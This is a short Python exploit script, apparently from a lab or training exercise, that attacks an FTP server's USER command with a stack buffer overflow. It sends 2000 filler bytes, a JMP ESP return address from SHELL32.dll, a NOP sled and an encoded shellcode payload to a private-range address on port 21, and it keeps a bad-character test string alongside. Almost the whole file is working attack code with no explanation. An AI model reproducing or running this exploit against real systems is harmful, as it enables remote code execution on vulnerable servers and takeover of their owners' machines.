#!/usr/bin/python

import sys, socket, time

#JMP user32.dll  ESP 7616F1F6
#ret = '\xF6\xF1\x16\x76'


#JMP ESP SHELL32.dll 7621F7Fd
ret = '\xFD\xF7\x21\x76'

sc =("\xbe\xa6\x54\xbe\x15\xd9\xc8\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x52\x83\xc0\x04\x31\x70\x0e\x03\xd6\x5a\x5c\xe0\xea\x8b\x22"
"\x0b\x12\x4c\x43\x85\xf7\x7d\x43\xf1\x7c\x2d\x73\x71\xd0\xc2"
"\xf8\xd7\xc0\x51\x8c\xff\xe7\xd2\x3b\x26\xc6\xe3\x10\x1a\x49"
"\x60\x6b\x4f\xa9\x59\xa4\x82\xa8\x9e\xd9\x6f\xf8\x77\x95\xc2"
"\xec\xfc\xe3\xde\x87\x4f\xe5\x66\x74\x07\x04\x46\x2b\x13\x5f"
"\x48\xca\xf0\xeb\xc1\xd4\x15\xd1\x98\x6f\xed\xad\x1a\xb9\x3f"
"\x4d\xb0\x84\x8f\xbc\xc8\xc1\x28\x5f\xbf\x3b\x4b\xe2\xb8\xf8"
"\x31\x38\x4c\x1a\x91\xcb\xf6\xc6\x23\x1f\x60\x8d\x28\xd4\xe6"
"\xc9\x2c\xeb\x2b\x62\x48\x60\xca\xa4\xd8\x32\xe9\x60\x80\xe1"
"\x90\x31\x6c\x47\xac\x21\xcf\x38\x08\x2a\xe2\x2d\x21\x71\x6b"
"\x81\x08\x89\x6b\x8d\x1b\xfa\x59\x12\xb0\x94\xd1\xdb\x1e\x63"
"\x15\xf6\xe7\xfb\xe8\xf9\x17\xd2\x2e\xad\x47\x4c\x86\xce\x03"
"\x8c\x27\x1b\x83\xdc\x87\xf4\x64\x8c\x67\xa5\x0c\xc6\x67\x9a"
"\x2d\xe9\xad\xb3\xc4\x10\x26\x7c\xb0\x83\x24\x14\xc3\xb3\x49"
"\x5e\x4a\x55\x23\xb0\x1b\xce\xdc\x29\x06\x84\x7d\xb5\x9c\xe1"
"\xbe\x3d\x13\x16\x70\xb6\x5e\x04\xe5\x36\x15\x76\xa0\x49\x83"
"\x1e\x2e\xdb\x48\xde\x39\xc0\xc6\x89\x6e\x36\x1f\x5f\x83\x61"
"\x89\x7d\x5e\xf7\xf2\xc5\x85\xc4\xfd\xc4\x48\x70\xda\xd6\x94"
"\x79\x66\x82\x48\x2c\x30\x7c\x2f\x86\xf2\xd6\xf9\x75\x5d\xbe"
"\x7c\xb6\x5e\xb8\x80\x93\x28\x24\x30\x4a\x6d\x5b\xfd\x1a\x79"
"\x24\xe3\xba\x86\xff\xa7\xcb\xcc\x5d\x81\x43\x89\x34\x93\x09"
"\x2a\xe3\xd0\x37\xa9\x01\xa9\xc3\xb1\x60\xac\x88\x75\x99\xdc"
"\x81\x13\x9d\x73\xa1\x31")

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

nop = '\x90' * 20

pattern = "A"*2000+ret+nop+sc #"C"*500 #badchars #"C"*5000
#pattern = "A"*2000+"B"*4+"C"*500 #badchars #"C"*5000
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.153.155',21))
s.recv(1024)
s.send("USER "+pattern)
s.close
